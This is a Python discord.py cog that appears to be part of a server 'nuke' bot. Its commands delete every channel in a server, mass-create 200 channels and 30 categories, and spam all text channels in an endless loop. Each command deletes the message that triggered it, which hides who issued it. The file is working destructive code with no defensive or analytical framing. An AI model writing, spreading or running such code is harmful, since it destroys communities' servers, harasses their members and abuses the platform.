"""Channels file"""

# Discord
import discord
from discord.ext import commands

# Utils
from utils import get_data

class Channels(commands.Cog):
    
    def __init__(self, bot):
        self.bot = bot
        
    
    @commands.command(aliases=['cc', 'Create_channels', 'create_channel', 'channels_create'])
    async def create_channels(self, ctx):
        """Create the channels with the name defined by the client"""
        await ctx.message.delete()
        guild = ctx.message.guild
        for channel in range(200):
            try:
                await guild.create_text_channel(get_data('channel_name'))
                print('Channel created')
            except:
                print('Cant create channel')
                continue

    
    @commands.command(aliases=['dc', 'Delete_channels', 'channels_delete'])
    async def delete_channels(self, ctx):
        """Delete all channels in the discord's server where the bot
        is allowed to delete channels"""
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                print('Channel deleted')
            except:
                print('Cant delete channel')
                continue
            
            
    @commands.command(aliases=['cg', 'Create_categories', 'create_category', 'categories_create'])
    async def create_categories(self, ctx):
        """Create the channels with the name defined by the client"""
        await ctx.message.delete()
        guild = ctx.message.guild
        for channel in range(30):
            try:
                await guild.create_category(get_data('category_name'))
                print('Category created')
            except:
                print('Cant create category')
                continue

            
    @commands.command(aliases=['Spam', 'spamming'])
    async def spam(self, ctx):
        """Spam all channels"""
        guild = ctx.guild
        while True:
            try:
                for channel in guild.text_channels:
                    await channel.send(get_data('spam_message'))
                    print('Message send') 
            except:
                print('Cant send message')
                continue


def setup(bot):
    bot.add_cog(Channels(bot))